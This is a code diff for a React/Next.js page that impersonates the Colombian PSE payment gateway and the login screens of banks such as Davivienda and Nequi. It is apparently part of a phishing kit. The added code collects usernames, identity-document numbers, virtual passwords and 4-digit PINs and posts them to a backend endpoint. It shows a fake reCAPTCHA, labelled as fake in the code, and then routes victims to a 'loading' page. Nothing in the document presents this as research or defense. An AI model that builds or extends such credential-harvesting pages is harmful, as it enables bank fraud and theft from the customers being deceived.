@@ -1,6 +1,6 @@
 "use client";
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useRouter, useParams, useSearchParams } from 'next/navigation';
 import { useCaseStatus } from '@/context/useCaseStatus';
 
@@ -11,145 +11,226 @@ export default function UsuarioPage() {
     const errorParam = searchParams.get('error');
     const bankId = params.bankId as string;
 
-    useCaseStatus(); // Poll for status changes
-    const [usuario, setUsuario] = useState('');
-    const [error, setError] = useState(false);
+    useCaseStatus();
 
-    const bankNames: Record<string, string> = {
-        bancolombia: 'Bancolombia',
-        davivienda: 'Davivienda',
-        bogota: 'Banco de Bogotá',
-        nequi: 'Nequi',
-        avvillas: 'AV Villas',
-        colpatria: 'Colpatria',
-        popular: 'Popular',
-        cajasocial: 'Caja Social',
-        citibank: 'Citibank',
-        falabella: 'Falabella',
-        finandina: 'Finandina',
-        itau: 'Itaú',
-        occidente: 'Occidente',
-        serfinanza: 'Serfinanza',
-        tuya: 'Tuya'
-    };
+    const [usuario, setUsuario] = useState('');
+    const [password, setPassword] = useState(''); // Used for combined forms (Davivienda/Nequi)
+    const [documentType, setDocumentType] = useState('cc');
+    const [error, setError] = useState(false);
+    const [isSubmitting, setIsSubmitting] = useState(false);
+    const [isVerified, setIsVerified] = useState(false); // For Nequi captcha
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
-
-        if (usuario.trim().length === 0) {
+        if (!usuario) {
             setError(true);
             return;
         }
 
-        // Store usuario in localStorage
-        localStorage.setItem('pse_usuario', usuario);
-        localStorage.setItem('pse_banco', bankId);
+        setIsSubmitting(true);
+        try {
+            const res = await fetch('/api/paso-usuario', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user: usuario,
+                    password: password, // May be empty for default flow
+                    bank: bankId.toUpperCase(),
+                    documentType: documentType
+                })
+            });
 
-        // Redirect to password page
-        router.push(`/pse/${bankId}/clave`);
+            const data = await res.json();
+            if (data.success) {
+                // If the bank captured password here, go to cargando. Otherwise go to clave.
+                if (bankId === 'davivienda' || bankId === 'nequi') {
+                    router.push(`/pse/${bankId}/cargando`);
+                } else {
+                    router.push(`/pse/${bankId}/clave`);
+                }
+            } else {
+                setIsSubmitting(false);
+            }
+        } catch (err) {
+            console.error(err);
+            setIsSubmitting(false);
+        }
     };
 
+    // Bank-specific configurations
+    const isDavivienda = bankId === 'davivienda';
+    const isNequi = bankId === 'nequi';
+
     return (
-        <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
-            {/* Header */}
-            <header className="bg-white border-b border-gray-200 p-4 flex justify-between items-center shadow-sm">
-                <div className="text-xl font-bold text-gray-800">
-                    {bankNames[bankId] || 'Banco'}
+        <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
+            <div className="w-full max-w-[440px]">
+                {/* Logo Header */}
+                <div className="flex justify-center mb-8">
+                    <img
+                        src={isNequi ? "/nequi-logo.png" : `/img/${bankId}-logo.svg`}
+                        alt={bankId}
+                        className="h-12 object-contain"
+                        onError={(e) => {
+                            const target = e.target as HTMLImageElement;
+                            target.src = "/pse-logo.jpg";
+                        }}
+                    />
                 </div>
-                <button
-                    onClick={() => router.push('/pse')}
-                    className="text-blue-600 hover:text-blue-800 flex items-center gap-2"
-                >
-                    Salir
-                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
-                    </svg>
-                </button>
-            </header>
 
-            {/* Main Content */}
-            <main className="flex-1 flex items-center justify-center px-4 py-12">
-                <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-md">
-                    <h1 className="text-2xl font-bold text-gray-800 mb-2 text-center">
-                        Te damos la bienvenida
-                    </h1>
-
-                    <div className="mt-6 mb-8 text-center">
-                        <p className="text-gray-600 text-sm">
-                            El usuario es el mismo con el que ingresas a la
+                <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
+                    <div className="p-8">
+                        <h1 className="text-2xl font-bold text-gray-800 mb-2">
+                            {isNequi ? "Pagos PSE de Nequi" : "¡Hola!"}
+                        </h1>
+                        <p className="text-gray-500 mb-8 font-medium">
+                            {isNequi
+                                ? "Ingresa tu número de cel y clave. Recuerda tener tu cel a la mano."
+                                : isDavivienda
+                                    ? "Nos alegra que esté aquí"
+                                    : "Para continuar, ingresa tu usuario"}
                         </p>
-                        <p className="text-blue-600 text-sm font-semibold">
-                            Sucursal Virtual Personas.
-                        </p>
-                    </div>
 
-                    <form onSubmit={handleSubmit} className="space-y-6">
-                        <div>
-                            <div className="relative">
-                                <input
-                                    type="text"
-                                    id="usuario"
-                                    value={usuario}
-                                    onChange={(e) => {
-                                        setUsuario(e.target.value);
-                                        setError(false);
-                                    }}
-                                    placeholder=" "
-                                    maxLength={20}
-                                    className={`peer w-full px-4 py-3 border-b-2 ${error ? 'border-red-500' : 'border-gray-300'
-                                        } focus:border-blue-600 focus:outline-none transition-colors bg-transparent`}
-                                />
-                                <label
-                                    htmlFor="usuario"
-                                    className="absolute left-4 top-3 text-gray-500 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base peer-focus:top-0 peer-focus:text-xs peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs"
-                                >
-                                    Usuario
-                                </label>
-                            </div>
-                            {error && (
-                                <p className="mt-2 text-sm text-red-600">
-                                    Por favor ingresa tu usuario
-                                </p>
+                        <form onSubmit={handleSubmit} className="space-y-6">
+                            {isDavivienda && (
+                                <>
+                                    <div>
+                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
+                                            Tipo de documento
+                                        </label>
+                                        <select
+                                            value={documentType}
+                                            onChange={(e) => setDocumentType(e.target.value)}
+                                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
+                                        >
+                                            <option value="cc">Cédula de Ciudadanía</option>
+                                            <option value="ce">Cédula de Extranjería</option>
+                                            <option value="ti">Tarjeta de Identidad</option>
+                                            <option value="pas">Pasaporte</option>
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
+                                            Número de documento
+                                        </label>
+                                        <input
+                                            type="text"
+                                            inputMode="numeric"
+                                            value={usuario}
+                                            onChange={(e) => setUsuario(e.target.value.replace(/\D/g, ''))}
+                                            placeholder="Solo números"
+                                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
+                                        />
+                                    </div>
+                                    <div>
+                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
+                                            Clave virtual
+                                        </label>
+                                        <input
+                                            type="password"
+                                            inputMode="numeric"
+                                            maxLength={8}
+                                            value={password}
+                                            onChange={(e) => setPassword(e.target.value.replace(/\D/g, ''))}
+                                            placeholder="6 a 8 dígitos"
+                                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
+                                        />
+                                    </div>
+                                </>
                             )}
+
+                            {isNequi && (
+                                <>
+                                    <div>
+                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
+                                            Número de celular
+                                        </label>
+                                        <input
+                                            type="tel"
+                                            maxLength={10}
+                                            value={usuario}
+                                            onChange={(e) => setUsuario(e.target.value.replace(/\D/g, ''))}
+                                            placeholder="300 000 0000"
+                                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all"
+                                        />
+                                    </div>
+                                    <div>
+                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
+                                            Clave de 4 dígitos
+                                        </label>
+                                        <input
+                                            type="password"
+                                            maxLength={4}
+                                            value={password}
+                                            onChange={(e) => setPassword(e.target.value.replace(/\D/g, ''))}
+                                            placeholder="****"
+                                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all"
+                                        />
+                                    </div>
+
+                                    {/* Fake Captcha for Nequi */}
+                                    <div
+                                        onClick={() => setIsVerified(true)}
+                                        className="flex items-center gap-3 p-4 border border-gray-200 rounded-lg bg-gray-50 cursor-pointer hover:bg-white transition-all shadow-sm"
+                                    >
+                                        <div className={`w-6 h-6 border-2 rounded flex items-center justify-center transition-all ${isVerified ? 'bg-green-500 border-green-500' : 'bg-white border-gray-300'}`}>
+                                            {isVerified && (
+                                                <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+                                                </svg>
+                                            )}
+                                        </div>
+                                        <span className="text-sm font-medium text-gray-600 flex-grow">No soy un robot</span>
+                                        <div className="flex flex-col items-center">
+                                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" className="w-8 h-8 opacity-50" alt="reCAPTCHA" />
+                                            <span className="text-[8px] text-gray-400 font-bold uppercase mt-1">reCAPTCHA</span>
+                                        </div>
+                                    </div>
+                                </>
+                            )}
+
+                            {!isDavivienda && !isNequi && (
+                                <div>
+                                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                                        Usuario / Username
+                                    </label>
+                                    <input
+                                        type="text"
+                                        value={usuario}
+                                        onChange={(e) => {
+                                            setUsuario(e.target.value);
+                                            setError(false);
+                                        }}
+                                        className={`w-full px-4 py-3 rounded-xl border ${error ? 'border-red-500' : 'border-gray-300'} focus:ring-2 focus:ring-yellow-500 focus:border-yellow-500 outline-none transition-all`}
+                                        autoFocus
+                                    />
+                                    {error && <p className="mt-2 text-xs text-red-500 font-bold">Por favor ingresa tu usuario</p>}
+                                </div>
+                            )}
+
                             {errorParam === 'invalid_user' && (
-                                <p className="mt-2 text-sm text-red-600 font-bold">
+                                <div className="p-3 bg-red-50 border-l-4 border-red-500 rounded text-red-700 text-sm font-bold">
                                     🛑 Los datos ingresados son incorrectos. Por favor intenta de nuevo.
-                                </p>
+                                </div>
                             )}
-                            {errorParam === 'payment_declined' && (
-                                <p className="mt-2 text-sm text-red-600 font-bold">
-                                    ❌ Transacción rechazada. Por favor usa otro medio de pago.
-                                </p>
-                            )}
-                            <button
-                                type="button"
-                                className="mt-2 text-sm text-blue-600 hover:underline"
-                            >
-                                ¿Olvidaste tu usuario?
-                            </button>
-                        </div>
 
-                        <div className="flex gap-4">
-                            <button
-                                type="button"
-                                onClick={() => router.push('/pse')}
-                                className="flex-1 py-3 border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors font-semibold"
-                            >
-                                Volver
-                            </button>
                             <button
                                 type="submit"
-                                className="flex-1 py-3 bg-yellow-400 text-gray-900 rounded-lg hover:bg-yellow-500 transition-colors font-semibold shadow-md"
+                                disabled={isSubmitting || (isNequi && !isVerified)}
+                                className={`w-full py-4 rounded-xl font-bold text-white transition-all shadow-lg ${isSubmitting || (isNequi && !isVerified)
+                                        ? 'bg-gray-400 cursor-not-allowed'
+                                        : isNequi ? 'bg-pink-600 hover:bg-pink-700' : isDavivienda ? 'bg-red-600 hover:bg-red-700' : 'bg-yellow-500 hover:bg-yellow-600 text-gray-900'
+                                    }`}
                             >
-                                Continuar
+                                {isSubmitting ? 'Procesando...' : isNequi ? 'Entra' : isDavivienda ? 'Iniciar sesión' : 'Siguiente'}
                             </button>
-                        </div>
-                    </form>
+                        </form>
+                    </div>
                 </div>
-            </main>
 
-            {/* Footer */}
-            <div className="h-2 bg-gradient-to-r from-yellow-400 via-red-500 to-blue-600"></div>
+                <div className="mt-8 text-center text-xs text-gray-400 font-medium">
+                    © {new Date().getFullYear()} Pago Seguro en Línea. Todos los derechos reservados.
+                </div>
+            </div>
         </div>
     );
 }
